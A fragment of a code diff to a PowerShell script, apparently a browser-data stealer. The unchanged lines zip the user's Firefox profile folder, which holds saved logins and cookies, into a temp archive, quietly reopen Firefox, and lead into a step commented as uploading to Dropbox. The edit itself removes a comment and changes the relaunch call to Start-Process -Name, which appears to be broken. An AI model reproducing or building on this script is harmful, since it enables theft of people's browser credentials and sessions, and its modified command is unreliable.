@@ -551,10 +551,10 @@ Compress-Archive -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profile
 
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
 
-#Abre de novo o firefox
+
 # Verificar se o Firefox foi fechado anteriormente e, se sim, reabri-lo
 if (-not $firefoxProcess) {
-    Start-Process "firefox"
+    Start-Process -Name "firefox"
 }
 # Upload para a Dropbox
 
